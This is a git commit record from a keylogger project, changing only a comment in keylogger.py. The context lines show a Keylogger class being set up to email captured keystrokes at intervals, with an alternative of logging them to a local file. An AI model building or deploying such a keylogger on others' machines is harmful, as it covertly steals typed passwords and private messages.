9fa15c0f1c88a3e872922779c0af02db370f8d7c
vishaalmehta1 <101203375+vishaalmehta1@users.noreply.github.com>
2023-09-22 10:57:21 -0400

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -109,7 +109,7 @@ class Keylogger:
 
     
 if __name__ == "__main__":
-    #TO CHANGE THE LOCATION FOR USER INPUT TO BE STORED, UNCOMMENT ONE OF THESE BELOW.
+    #TO CHANGE THE LOCATION FOR USER INPUT TO BE STORED, UNCOMMENT ONE OF THESE BELOW. YOU CAN ALSO COMMENT OUT THE METHOD THAT YOU AREN'T GOING TO USE.
     # if you want a keylogger to send to your email
     keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
     # if you want a keylogger to record keystrokes to a local file 
